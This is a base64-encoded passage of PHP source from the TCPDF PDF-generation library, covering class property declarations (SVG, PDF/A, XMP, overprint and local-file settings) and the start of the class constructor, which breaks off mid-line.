KiBAc2luY2UgNS45LjIwNCAoMjAxMy0wMS0yMykKCSAqLwoJcHJvdGVjdGVkICRlZm5hbWVzID0gYXJyYXkoKTsKCgkvKioKCSAqIERpcmVjdG9yeSB1c2VkIGZvciB0aGUgbGFzdCBTVkcgaW1hZ2UuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNS4wLjAwMCAoMjAxMC0wNS0wNSkKCSAqLwoJcHJvdGVjdGVkICRzdmdkaXIgPSAnJzsKCgkvKioKCSAqICBEZWFmdWx0IHVuaXQgb2YgbWVhc3VyZSBmb3IgU1ZHLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDUuMC4wMDAgKDIwMTAtMDUtMDIpCgkgKi8KCXByb3RlY3RlZCAkc3ZndW5pdCA9ICdweCc7CgoJLyoqCgkgKiBBcnJheSBvZiBTVkcgZ3JhZGllbnRzLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDUuMC4wMDAgKDIwMTAtMDUtMDIpCgkgKi8KCXByb3RlY3RlZCAkc3ZnZ3JhZGllbnRzID0gYXJyYXkoKTsKCgkvKioKCSAqIElEIG9mIGxhc3QgU1ZHIGdyYWRpZW50LgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDUuMC4wMDAgKDIwMTAtMDUtMDIpCgkgKi8KCXByb3RlY3RlZCAkc3ZnZ3JhZGllbnRpZCA9IDA7CgoJLyoqCgkgKiBCb29sZWFuIHZhbHVlIHRydWUgd2hlbiBpbiBTVkcgZGVmcyBncm91cC4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA1LjAuMDAwICgyMDEwLTA1LTAyKQoJICovCglwcm90ZWN0ZWQgJHN2Z2RlZnNtb2RlID0gZmFsc2U7CgoJLyoqCgkgKiBBcnJheSBvZiBTVkcgZGVmcy4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA1LjAuMDAwICgyMDEwLTA1LTAyKQoJICovCglwcm90ZWN0ZWQgJHN2Z2RlZnMgPSBhcnJheSgpOwoKCS8qKgoJICogQm9vbGVhbiB2YWx1ZSB0cnVlIHdoZW4gaW4gU1ZHIGNsaXBQYXRoIHRhZy4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA1LjAuMDAwICgyMDEwLTA0LTI2KQoJICovCglwcm90ZWN0ZWQgJHN2Z2NsaXBtb2RlID0gZmFsc2U7CgoJLyoqCgkgKiBBcnJheSBvZiBTVkcgY2xpcFBhdGggY29tbWFuZHMuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNS4wLjAwMCAoMjAxMC0wNS0wMikKCSAqLwoJcHJvdGVjdGVkICRzdmdjbGlwcGF0aHMgPSBhcnJheSgpOwoKCS8qKgoJICogQXJyYXkgb2YgU1ZHIGNsaXBQYXRoIHRyYW5mb3JtYXRpb24gbWF0cml4LgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDUuOC4wMjIgKDIwMTAtMDgtMzEpCgkgKi8KCXByb3RlY3RlZCAkc3ZnY2xpcHRtID0gYXJyYXkoKTsKCgkvKioKCSAqIElEIG9mIGxhc3QgU1ZHIGNsaXBQYXRoLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDUuMC4wMDAgKDIwMTAtMDUtMDIpCgkgKi8KCXByb3RlY3RlZCAkc3ZnY2xpcGlkID0gMDsKCgkvKioKCSAqIFNWRyB0ZXh0LgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDUuMC4wMDAgKDIwMTAtMDUtMDIpCgkgKi8KCXByb3RlY3RlZCAkc3ZndGV4dCA9ICcnOwoKCS8qKgoJICogU1ZHIHRleHQgcHJvcGVydGllcy4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA1LjguMDEzICgyMDEwLTA4LTIzKQoJICovCglwcm90ZWN0ZWQgJHN2Z3RleHRtb2RlID0gYXJyYXkoKTsKCgkvKioKCSAqIEFycmF5IG9mIFNWRyBwcm9wZXJ0aWVzLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDUuMC4wMDAgKDIwMTAtMDUtMDIpCgkgKi8KCXByb3RlY3RlZCAkc3Znc3R5bGVzID0gYXJyYXkoYXJyYXkoCgkJJ2FsaWdubWVudC1iYXNlbGluZScgPT4gJ2F1dG8nLAoJCSdiYXNlbGluZS1zaGlmdCcgPT4gJ2Jhc2VsaW5lJywKCQknY2xpcCcgPT4gJ2F1dG8nLAoJCSdjbGlwLXBhdGgnID0+ICdub25lJywKCQknY2xpcC1ydWxlJyA9PiAnbm9uemVybycsCgkJJ2NvbG9yJyA9PiAnYmxhY2snLAoJCSdjb2xvci1pbnRlcnBvbGF0aW9uJyA9PiAnc1JHQicsCgkJJ2NvbG9yLWludGVycG9sYXRpb24tZmlsdGVycycgPT4gJ2xpbmVhclJHQicsCgkJJ2NvbG9yLXByb2ZpbGUnID0+ICdhdXRvJywKCQknY29sb3ItcmVuZGVyaW5nJyA9PiAnYXV0bycsCgkJJ2N1cnNvcicgPT4gJ2F1dG8nLAoJCSdkaXJlY3Rpb24nID0+ICdsdHInLAoJCSdkaXNwbGF5JyA9PiAnaW5saW5lJywKCQknZG9taW5hbnQtYmFzZWxpbmUnID0+ICdhdXRvJywKCQknZW5hYmxlLWJhY2tncm91bmQnID0+ICdhY2N1bXVsYXRlJywKCQknZmlsbCcgPT4gJ2JsYWNrJywKCQknZmlsbC1vcGFjaXR5JyA9PiAxLAoJCSdmaWxsLXJ1bGUnID0+ICdub256ZXJvJywKCQknZmlsdGVyJyA9PiAnbm9uZScsCgkJJ2Zsb29kLWNvbG9yJyA9PiAnYmxhY2snLAoJCSdmbG9vZC1vcGFjaXR5JyA9PiAxLAoJCSdmb250JyA9PiAnJywKCQknZm9udC1mYW1pbHknID0+ICdoZWx2ZXRpY2EnLAoJCSdmb250LXNpemUnID0+ICdtZWRpdW0nLAoJCSdmb250LXNpemUtYWRqdXN0JyA9PiAnbm9uZScsCgkJJ2ZvbnQtc3RyZXRjaCcgPT4gJ25vcm1hbCcsCgkJJ2ZvbnQtc3R5bGUnID0+ICdub3JtYWwnLAoJCSdmb250LXZhcmlhbnQnID0+ICdub3JtYWwnLAoJCSdmb250LXdlaWdodCcgPT4gJ25vcm1hbCcsCgkJJ2dseXBoLW9yaWVudGF0aW9uLWhvcml6b250YWwnID0+ICcwZGVnJywKCQknZ2x5cGgtb3JpZW50YXRpb24tdmVydGljYWwnID0+ICdhdXRvJywKCQknaW1hZ2UtcmVuZGVyaW5nJyA9PiAnYXV0bycsCgkJJ2tlcm5pbmcnID0+ICdhdXRvJywKCQknbGV0dGVyLXNwYWNpbmcnID0+ICdub3JtYWwnLAoJCSdsaWdodGluZy1jb2xvcicgPT4gJ3doaXRlJywKCQknbWFya2VyJyA9PiAnJywKCQknbWFya2VyLWVuZCcgPT4gJ25vbmUnLAoJCSdtYXJrZXItbWlkJyA9PiAnbm9uZScsCgkJJ21hcmtlci1zdGFydCcgPT4gJ25vbmUnLAoJCSdtYXNrJyA9PiAnbm9uZScsCgkJJ29wYWNpdHknID0+IDEsCgkJJ292ZXJmbG93JyA9PiAnYXV0bycsCgkJJ3BvaW50ZXItZXZlbnRzJyA9PiAndmlzaWJsZVBhaW50ZWQnLAoJCSdzaGFwZS1yZW5kZXJpbmcnID0+ICdhdXRvJywKCQknc3RvcC1jb2xvcicgPT4gJ2JsYWNrJywKCQknc3RvcC1vcGFjaXR5JyA9PiAxLAoJCSdzdHJva2UnID0+ICdub25lJywKCQknc3Ryb2tlLWRhc2hhcnJheScgPT4gJ25vbmUnLAoJCSdzdHJva2UtZGFzaG9mZnNldCcgPT4gMCwKCQknc3Ryb2tlLWxpbmVjYXAnID0+ICdidXR0JywKCQknc3Ryb2tlLWxpbmVqb2luJyA9PiAnbWl0ZXInLAoJCSdzdHJva2UtbWl0ZXJsaW1pdCcgPT4gNCwKCQknc3Ryb2tlLW9wYWNpdHknID0+IDEsCgkJJ3N0cm9rZS13aWR0aCcgPT4gMSwKCQkndGV4dC1hbmNob3InID0+ICdzdGFydCcsCgkJJ3RleHQtZGVjb3JhdGlvbicgPT4gJ25vbmUnLAoJCSd0ZXh0LXJlbmRlcmluZycgPT4gJ2F1dG8nLAoJCSd1bmljb2RlLWJpZGknID0+ICdub3JtYWwnLAoJCSd2aXNpYmlsaXR5JyA9PiAndmlzaWJsZScsCgkJJ3dvcmQtc3BhY2luZycgPT4gJ25vcm1hbCcsCgkJJ3dyaXRpbmctbW9kZScgPT4gJ2xyLXRiJywKCQkndGV4dC1jb2xvcicgPT4gJ2JsYWNrJywKCQkndHJhbnNmbWF0cml4JyA9PiBhcnJheSgxLCAwLCAwLCAxLCAwLCAwKQoJCSkpOwoKCS8qKgoJICogSWYgdHJ1ZSBmb3JjZSBzUkdCIGNvbG9yIHByb2ZpbGUgZm9yIGFsbCBkb2N1bWVudC4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA1LjkuMTIxICgyMDExLTA5LTI4KQoJICovCglwcm90ZWN0ZWQgJGZvcmNlX3NyZ2IgPSBmYWxzZTsKCgkvKioKCSAqIElmIHRydWUgc2V0IHRoZSBkb2N1bWVudCB0byBQREYvQSBtb2RlLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDUuOS4xMjEgKDIwMTEtMDktMjcpCgkgKi8KCXByb3RlY3RlZCAkcGRmYV9tb2RlID0gZmFsc2U7CgoJLyoqCgkgKiB2ZXJzaW9uIG9mIFBERi9BIG1vZGUgKDEgLSAzKS4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA2LjIuMjYgKDIwMTktMDMtMTIpCgkgKi8KCXByb3RlY3RlZCAkcGRmYV92ZXJzaW9uID0gMTsKCgkvKioKCSAqIERvY3VtZW50IGNyZWF0aW9uIGRhdGUtdGltZQoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDUuOS4xNTIgKDIwMTItMDMtMjIpCgkgKi8KCXByb3RlY3RlZCAkZG9jX2NyZWF0aW9uX3RpbWVzdGFtcDsKCgkvKioKCSAqIERvY3VtZW50IG1vZGlmaWNhdGlvbiBkYXRlLXRpbWUKCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA1LjkuMTUyICgyMDEyLTAzLTIyKQoJICovCglwcm90ZWN0ZWQgJGRvY19tb2RpZmljYXRpb25fdGltZXN0YW1wOwoKCS8qKgoJICogQ3VzdG9tIFhNUCBkYXRhLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDUuOS4xMjggKDIwMTEtMTAtMDYpCgkgKi8KCXByb3RlY3RlZCAkY3VzdG9tX3htcCA9ICcnOwoKCS8qKgoJICogQ3VzdG9tIFhNUCBSREYgZGF0YS4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA2LjMuMCAoMjAxOS0wOS0xOSkKCSAqLwoJcHJvdGVjdGVkICRjdXN0b21feG1wX3JkZiA9ICcnOwoKCS8qKgoJICogT3ZlcnByaW50IG1vZGUgYXJyYXkuCgkgKiAoQ2hlY2sgdGhlICJFbnRyaWVzIGluIGEgR3JhcGhpY3MgU3RhdGUgUGFyYW1ldGVyIERpY3Rpb25hcnkiIG9uIFBERiAzMjAwMC0xOjIwMDgpLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDUuOS4xNTIgKDIwMTItMDMtMjMpCgkgKiBAdmFyIGFycmF5PHN0cmluZyxib29sfGludD4KCSAqLwoJcHJvdGVjdGVkICRvdmVycHJpbnQgPSBhcnJheSgnT1AnID0+IGZhbHNlLCAnb3AnID0+IGZhbHNlLCAnT1BNJyA9PiAwKTsKCgkvKioKCSAqIEFscGhhIG1vZGUgYXJyYXkuCgkgKiAoQ2hlY2sgdGhlICJFbnRyaWVzIGluIGEgR3JhcGhpY3MgU3RhdGUgUGFyYW1ldGVyIERpY3Rpb25hcnkiIG9uIFBERiAzMjAwMC0xOjIwMDgpLgoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDUuOS4xNTIgKDIwMTItMDMtMjMpCgkgKi8KCXByb3RlY3RlZCAkYWxwaGEgPSBhcnJheSgnQ0EnID0+IDEsICdjYScgPT4gMSwgJ0JNJyA9PiAnL05vcm1hbCcsICdBSVMnID0+IGZhbHNlKTsKCgkvKioKCSAqIERlZmluZSB0aGUgcGFnZSBib3VuZGFyaWVzIGJveGVzIHRvIGJlIHNldCBvbiBkb2N1bWVudC4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA1LjkuMTUyICgyMDEyLTAzLTIzKQoJICovCglwcm90ZWN0ZWQgJHBhZ2VfYm94ZXMgPSBhcnJheSgnTWVkaWFCb3gnLCAnQ3JvcEJveCcsICdCbGVlZEJveCcsICdUcmltQm94JywgJ0FydEJveCcpOwoKCS8qKgoJICogSWYgdHJ1ZSBwcmludCBUQ1BERiBtZXRhIGxpbmsuCgkgKiBAcHJvdGVjdGVkCgkgKiBAc2luY2UgNS45LjE1MiAoMjAxMi0wMy0yMykKCSAqLwoJcHJvdGVjdGVkICR0Y3BkZmxpbmsgPSB0cnVlOwoKCS8qKgoJICogQ2FjaGUgYXJyYXkgZm9yIGNvbXB1dGVkIEdEIGdhbW1hIHZhbHVlcy4KCSAqIEBwcm90ZWN0ZWQKCSAqIEBzaW5jZSA1LjkuMTYzMiAoMjAxMi0wNi0wNSkKCSAqLwoJcHJvdGVjdGVkICRnZGdhbW1hY2FjaGUgPSBhcnJheSgpOwoKICAgIC8qKgogICAgICogQ2FjaGUgYXJyYXkgZm9yIGZpbGUgY29udGVudAogICAgICogQHByb3RlY3RlZAogICAgICogQHZhciBhcnJheQogICAgICogQHNpbmNlIDYuMy41ICgyMDIwLTA5LTI4KQogICAgICovCglwcm90ZWN0ZWQgJGZpbGVDb250ZW50Q2FjaGUgPSBhcnJheSgpOwoKCS8qKgoJICogV2hldGhlciB0byBhbGxvdyBsb2NhbCBmaWxlIHBhdGggaW4gaW1hZ2UgaHRtbCB0YWdzLCB3aGVuIHByZWZpeGVkIHdpdGggZmlsZTovLwoJICoKCSAqIEB2YXIgYm9vbAoJICogQHByb3RlY3RlZAoJICogQHNpbmNlIDYuNCAoMjAyMC0wNy0yMykKCSAqLwoJcHJvdGVjdGVkICRhbGxvd0xvY2FsRmlsZXMgPSBmYWxzZTsKCgkvLy0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQoJLy8gTUVUSE9EUwoJLy8tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCgkvKioKCSAqIFRoaXMgaXMgdGhlIGNsYXNzIGNvbnN0cnVjdG9yLgoJICogSXQgYWxsb3dzIHRvIHNldCB1cCB0aGUgcGFnZSBmb3JtYXQsIHRoZSBvcmllbnRhdGlvbiBhbmQgdGhlIG1lYXN1cmUgdW5pdCB1c2VkIGluIGFsbCB0aGUgbWV0aG9kcyAoZXhjZXB0IGZvciB0aGUgZm9udCBzaXplcykuCgkgKgoJICogQHBhcmFtIHN0cmluZyAkb3JpZW50YXRpb24gcGFnZSBvcmllbnRhdGlvbi4gUG9zc2libGUgdmFsdWVzIGFyZSAoY2FzZSBpbnNlbnNpdGl2ZSk6PHVsPjxsaT5QIG9yIFBvcnRyYWl0IChkZWZhdWx0KTwvbGk+PGxpPkwgb3IgTGFuZHNjYXBlPC9saT48bGk+JycgKGVtcHR5IHN0cmluZykgZm9yIGF1dG9tYXRpYyBvcmllbnRhdGlvbjwvbGk+PC91bD4KCSAqIEBwYXJhbSBzdHJpbmcgJHVuaXQgVXNlciBtZWFzdXJlIHVuaXQuIFBvc3NpYmxlIHZhbHVlcyBhcmU6PHVsPjxsaT5wdDogcG9pbnQ8L2xpPjxsaT5tbTogbWlsbGltZXRlciAoZGVmYXVsdCk8L2xpPjxsaT5jbTogY2VudGltZXRlcjwvbGk+PGxpPmluOiBpbmNoPC9saT48L3VsPjxiciAvPkEgcG9pbnQgZXF1YWxzIDEvNzIgb2YgaW5jaCwgdGhhdCBpcyB0byBzYXkgYWJvdXQgMC4zNSBtbSAoYW4gaW5jaCBiZWluZyAyLjU0IGNtKS4gVGhpcyBpcyBhIHZlcnkgY29tbW9uIHVuaXQgaW4gdHlwb2dyYXBoeTsgZm9udCBzaXplcyBhcmUgZXhwcmVzc2VkIGluIHRoYXQgdW5pdC4KCSAqIEBwYXJhbSBtaXhlZCAkZm9ybWF0IFRoZSBmb3JtYXQgdXNlZCBmb3IgcGFnZXMuIEl0IGNhbiBiZSBlaXRoZXI6IG9uZSBvZiB0aGUgc3RyaW5nIHZhbHVlcyBzcGVjaWZpZWQgYXQgZ2V0UGFnZVNpemVGcm9tRm9ybWF0KCkgb3IgYW4gYXJyYXkgb2YgcGFyYW1ldGVycyBzcGVjaWZpZWQgYXQgc2V0UGFnZUZvcm1hdCgpLgoJICogQHBhcmFtIGJvb2xlYW4gJHVuaWNvZGUgVFJVRSBtZWFucyB0aGF0IHRoZSBpbnB1dCB0ZXh0IGlzIHVuaWNvZGUgKGRlZmF1bHQgPSB0cnVlKQoJICogQHBhcmFtIHN0cmluZyAkZW5jb2RpbmcgQ2hhcnNldCBlbmNvZGluZyAodXNlZCBvbmx5IHdoZW4gY29udmVydGluZyBiYWNrIGh0bWwgZW50aXRpZXMpOyBkZWZhdWx0IGlzIFVURi04LgoJICogQHBhcmFtIGJvb2xlYW4gJGRpc2tjYWNoZSBERVBSRUNBVEVEIEZFQVRVUkUKCSAqIEBwYXJhbSBmYWxzZXxpbnRlZ2VyICRwZGZhIElmIG5vdCBmYWxzZSwgc2V0IHRoZSBkb2N1bWVudCB0byBQREYvQSBtb2RlIGFuZCB0aGUgZ29vZCB2ZXJzaW9uICgxIG9yIDMpLgoJICogQHB1YmxpYwoJICogQHNlZSBnZXRQYWdlU2l6ZUZyb21Gb3JtYXQoKSwgc2V0UGFnZUZvcm1hdCgpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBfX2NvbnN0cnVjdCgkb3JpZW50YXRpb249J1AnLCAkdW5pdD0nbW0nLCAkZm9ybWF0PSdBNCcsICR1bmljb2RlPXRydWUsICRlbmNvZGluZz0nVVRGLTgnLCAkZGlza2NhY2hlPWZhbHNlLCAkcGRmYT1mYWxzZSkgewoJCS8vIHNldCBmaWxlIElEIGZvciB0cmFpbGVyCgkJJHNlcmZvcm1hdCA9IChpc19hcnJheSgkZm9ybWF0KSA/IGpzb25fZW5jb2RlKCRmb3JtYXQpIDogJGZvcm1hdCk7CgkJJHRoaXMtPmZpbGVfaWQgPSBtZDUoVENQREZfU1RBVElDOjpnZXRSYW5kb21TZWVkKCdUQ1BERicuJG9yaWVudGF0aW9uLiR1bml0LiRzZXJmb3JtYXQuJGVuY29kaW5nKSk7CgkJJHRoaXMtPmhhc2hfa2V5ID0gaGFzaF9obWFjKCdzaGEyNTYnLCBUQ1BERl9TVEFUSUM6OmdldFJhbmRvbVNlZWQoJHRoaXMtPmZpbGVfaWQpLCBUQ1BERl9TVEFUSUM6OmdldFJhbmRvbVNlZWQoJ1RDUERGJyksIGZhbHNlKTsKCQkkdGhpcy0+Zm9udF9vYmpfaWRzID0gYXJyYXkoKTsKCQkkdGhpcy0+cGFnZV9vYmpfaWQgPSBhcnJheSgpOwoJCSR0aGlzLT5mb3JtX29ial9pZCA9IGFycmF5KCk7CgkJLy8gc2V0IHBkZi9hIG1vZGUKCQlpZiAoJHBkZmEgIT0gZmFsc2UpIHsKCQkJJHRoaXMtPnBkZmFfbW9kZSA9IHRydWU7CgkJCSR0aGlzLT5wZGZhX3ZlcnNpb24gPSAkcGRmYTsgIC8vIDEgb3IgMwoJCX0gZWxzZQoJCQkkdGhpcy0+cGRmYV9tb2RlID0gZmFsc2U7CgoJCSR0aGlzLT5mb3JjZV9zcmdiID0gZmFsc2U7CgkJLy8gc2V0IGxhbmd1YWdlIGRpcmVjdGlvbgoJCSR0aGlzLT5ydGwgPSBmYWxzZTsKCQkkdGhpcy0+dG1wcnRsID0gZmFsc2U7CgkJLy8gc29tZSBjaGVja3MKCQkkdGhpcy0+X2RvY2hlY2tzKCk7CgkJLy8gaW5pdGlhbGl6YXRpb24gb2YgcHJvcGVydGllcwoJCSR0aGlzLT5pc3VuaWNvZGUgPSAkdW5pY29kZTsKCQkkdGhpcy0+cGFnZSA9IDA7CgkJJHRoaXMtPnRyYW5zZm1ya1swXSA9IGFycmF5KCk7CgkJJHRoaXMtPnBhZ2VkaW0gPSBhcnJheSgpOwoJCSR0aGlzLT5uID0gMjsKCQkkdGhpcy0+YnVmZmVyID0gJyc7CgkJJHRoaXMtPnBhZ2VzID0gYXJyYXkoKTsKCQkkdGhpcy0+c3RhdGUgPSAwOwoJCSR0aGlzLT5mb250cyA9IGFycmF5KCk7CgkJJHRoaXMtPkZvbnRGaWxlcyA9IGFycmF5KCk7CgkJJHRoaXMtPmRpZmZzID0gYXJyYXkoKTsKCQkkdGhpcy0+aW1hZ2VzID0gYXJyYXkoKTsKCQkkdGhpcy0+bGlua3MgPSBhcnJheSgpOwoJCSR0aGlzLT5ncmFkaWVudHMgPSBhcnJheSgpOwoJCSR0aGlzLT5JbkZvb3RlciA9IGZhbHNlOwoJCSR0aGlzLT5sYXN0aCA9IDA7CgkJJHRoaXMtPkZvbnRGYW1pbHkgPSBkZWZpbmVkKCdQREZfRk9OVF9OQU1FX01BSU4nKT9QREZfRk9OVF9OQU1FX01BSU46J2hlbHZldGljYSc7CgkJJHRoaXMtPkZvbnRTdHlsZSA9ICcnOwoJCSR0aGlzLT5Gb250U2l6ZVB0ID0gMTI7CgkJJHRoaXMtPnVuZGVybGluZSA9IGZhbHNlOwoJCSR0aGlzLT5vdmVybGluZSA9IGZhbHNlOwoJCSR0aGlzLT5saW5ldGhyb3VnaCA9IGZhbHNlOwoJCSR0aGlzLT5EcmF3Q29sb3IgPSAnMCBHJzsKCQkkdGhpcy0+RmlsbENvbG9yID0gJzAgZyc7CgkJJHRoaXMtPlRleHRDb2xvciA9ICcwIGcnOwoJCSR0aGlzLT5Db2xvckZsYWcgPSBmYWxzZTsKCQkkdGhpcy0+cGRmbGF5ZXJzID0gYXJyYXkoKTsKCQkvLyBlbmNyeXB0aW9uIHZhbHVlcwoJCSR0aGlzLT5lbmNyeXB0ZWQgPSBmYWxzZTsKCQkkdGhpcy0+bGFzdF9lbmNfa2V5ID0gJyc7CgkJLy8gc3RhbmRhcmQgVW5pY29kZSBmb250cwoJCSR0aGlzLT5Db3JlRm9udHMgPSBhcnJheSgKCQkJJ2NvdXJpZXInPT4nQ291cmllcicsCgkJCSdjb3VyaWVyQic9PidDb3VyaWVyLUJvbGQnLAoJCQknY291cmllckknPT4nQ291cmllci1PYmxpcXVlJywKCQkJJ2NvdXJpZXJCSSc9PidDb3VyaWVyLUJvbGRPYmxpcXVlJywKCQkJJ2hlbHZldGljYSc9PidIZWx2ZXRpY2EnLAoJCQknaGVsdmV0aWNhQic9PidIZWx2ZXRpY2EtQm9sZCcsCgkJCSdoZWx2ZXRpY2FJJz0+J0hlbHZldGljYS1PYmxpcXVlJywKCQkJJ2hlbHZldGljYUJJJz0+J0hlbHZldGljYS1Cb2xkT2JsaXF1ZScsCgkJCSd0aW1lcyc9PidUaW1lcy1Sb21hbicsCgkJCSd0aW1lc0InPT4nVGltZXMtQm9sZCcsCgkJCSd0aW1lc0knPT4nVGltZXMtSXRhbGljJywKCQkJJ3RpbWVzQkknPT4nVGltZXMtQm9sZEl0YWxpYycsCgkJCSdzeW1ib2wnPT4nU3ltYm9sJywKCQkJJ3phcGZkaW5nYmF0cyc9PidaYXBmRGluZ2JhdHMnCgkJKTsKCQkvLyBzZXQgc2NhbGUgZmFjdG9yCgkJJHRoaXMtPnNldFBhZ2VVbml0KCR1bml0KTsKCQkvLyBzZXQgcGFnZSBmb3JtYXQgYW5kIG9yaWVudGF0aW9uCgkJJHRoaXMtPnNldFBhZ2VGb3JtYXQoJGZvcm1hdCwgJG9yaWVudGF0aW9uKTsKCQkvLyBwYWdlIG1hcmdpbnMgKDEgY20pCgkJJG1hcmdpbiA9IDI4LjM1IC8gJHRoaXMtPms7CgkJJHRoaXMtPnNldE1hcmdpbnMoJG1hcmdpbiwgJG1hcmdpbik7CgkJJHRoaXMtPmNsTWFyZ2luID0gJHRoaXMtPmxNYXJnaW47CgkJJHRoaXMtPmNyTWFyZ2luID0gJHRoaXMtPnJNYXJnaW47CgkJLy8gaW50ZXJuYWwgY2VsbCBwYWRkaW5nCgkJJGNwYWRkaW5nID0gJG1hcmdpbiAvIDEwOwoJCSR0aGlzLT5zZXRDZWxsUGFkZGluZ3MoJGNwYWRkaW5nLCAwLCAkY3BhZGRpbmcsIDApOwoJCS8vIGNlbGwgbWFyZ2lucwoJCSR0aGlzLT5zZXRDZWxsTWFyZ2lucygwLCAwLCAwLCAwKTsKCQkvLyBsaW5lIHdpZHRoICgwLjIgbW0pCgkJJHRoaXMtPkxpbmVXaWR0aCA9IDAuNTcgLyAkdGhpcy0+azsKCQkkdGhpcy0+bGluZXN0eWxlV2lkdGggPSBzcHJpbnRmKCclRiB3JywgKCR0aGlzLT5MaW5lV2lkdGggKiAkdGhpcy0+aykpOwoJCSR0aGlzLT5saW5lc3R5bGVDYXAgPSAnMCBKJzsKCQkkdGhpcy0+bGluZXN0eWxlSm9pbiA9ICcwIGonOwoJCSR0aGlzLT5saW5lc3R5bGVEYXNoID0gJ1tdIDAgZCc7CgkJLy8gYXV0b21hdGljIHBhZ2UgYnJlYWsKCQkkdGhpcy0+c2V0QXV0b1BhZ2VCcmVhayh0cnVlLCAoMiAqICRtYXJnaW4pKTsKCQkvLyBmdWxsIHdpZHRoIGRpc3BsYXkgbW9kZQoJCSR0aGlzLT5zZXREaXNwbGF5TW9kZSgnZnVsbHdpZHRoJyk7CgkJLy8gY29tcHJlc3Npb24KCQkkdGhpcy0+c2V0Q29tcHJlc3Npb24oKTsKCQkvLyBzZXQgZGVmYXVsdCBQREYgdmVyc2lvbiBudW1iZXIKCQkkdGhpcy0+c2V0UERGVmVyc2lvbigpOwoJCSR0aGlzLT50Y3BkZmxpbmsgPSB0cnVlOwoJCSR0aGlzLT5lbmNvZGluZyA9ICRlbmNvZGluZzsKCQkkdGhpcy0+SFJFRiA9IGFycmF5KCk7CgkJJHRoaXMtPmdldEZvbnRzTGlzdCgpOwoJCSR0aGlzLT5mZ2NvbG9yID0gYXJyYXkoJ1InID0+IDAsICdHJyA9PiAwLCAnQicgPT4gMCk7CgkJJHRoaXMtPnN0cm9rZWNvbG9yID0gYXJyYXkoJ1InID0+IDAsICdHJyA9PiAwLCAnQicgPT4gMCk7CgkJJHRoaXMtPmJnY29sb3IgPSBhcnJheSgnUicgPT4gMjU1LCAnRycgPT4gMjU1LCAnQicgPT4gMjU1KTsKCQkkdGhpcy0+ZXh0Z3N0YXRlcyA9IGFycmF5KCk7CgkJJHRoaXMtPnNldFRleHRTaGFkb3coKTsKCQkvLyBzaWduYXR1cmUKCQkkdGhpcy0+c2lnbiA9IGZhbHNlOwoJCSR0aGlzLT50c2FfdGltZXN0YW1wID0gZmFsc2U7CgkJJHRoaXMtPnRzYV9kYXRhID0gYXJyYXkoKTsKCQkkdGhpcy0+c2lnbmF0dXJlX2FwcGVhcmFuY2UgPSBhcnJheSgncGFnZScgPT4gMSwgJ3JlY3QnID0+ICcwIDAgMCAwJywgJ25hbWUnID0+ICdTaWduYXR1cmUnKTsKCQkkdGhpcy0+ZW1wdHlfc2lnbmF0dXJlX2FwcGVhcmFuY2UgPSBhcnJheSgpOwoJCS8vIHVzZXIncyByaWdodHMKCQkkdGhpcy0+dXJbJ2VuYWJsZWQnXSA9IGZhbHNlOwoJCSR0aGlzLT51clsnZG9jdW1lbnQnXSA9ICcvRnVsbFNhdmUnOwoJCSR0aGlzLT51clsnYW5ub3RzJ10gPSAnL0NyZWF0ZS9EZWxldGUvTW9kaWZ5L0NvcHkvSW1wb3J0L0V4cG9ydCc7CgkJJHRoaXMtPnVyWydmb3JtJ10gPSAnL0FkZC9EZWxldGUvRmlsbEluL0ltcG9ydC9FeHBvcnQvU3VibWl0U3RhbmRhbG9uZS9TcGF3blRlbXBsYXRlJzsKCQkkdGhpcy0+dXJbJ3NpZ25hdHVyZSddID0gJy9Nb2RpZnknOwoJCSR0aGlzLT51clsnZWYnXSA9ICcvQ3JlYXRlL0RlbGV0ZS9Nb2RpZnkvSW1wb3J0JzsKCQkkdGhpcy0+dXJbJ2Zvcm1leCddID0gJyc7CgkJLy8gc2V0IGRlZmF1bHQgSlBFRyBxdWFsaXR5CgkJJHRoaXMtPmpwZWdfcXVhbGl0eSA9IDc1OwoJCS8vIGluaXRpYWxpemUgc29tZSBzZXR0aW5ncwoJCVRDUERGX0ZPTlRTOjp1dGY4QmlkaShhcnJheSgpLCAnJywgZmFsc2UsICR0aGlzLT5pc3VuaWNvZGUsICR0aGlzLT5DdXJyZW50Rm9udCk7CgkJLy8gc2V0IGRlZmF1bHQgZm9udAoJCSR0aGlzLT5zZXRGb250KCR0aGlzLT5Gb250RmFtaWx5LCAkdGhpcy0+Rm9udFN0eWxlLCAkdGhpcy0+Rm9udFNpemVQdCk7CgkJJHRoaXMtPnNldEhlYWRlckZvbnQoYXJyYXkoJHRoaXMtPkZvbnRGYW1pbHksICR0aGlzLT5Gb250U3R5bGUsICR0aGlzLT5Gb250U2l6ZVB0KSk7CgkJJHRoaXMtPnNldEZvb3RlckZvbnQoYXJyYXkoJHRoaXMtPkZvbnRGYW1pbHksICR0aGlzLT5Gb250U3R5bGUsICR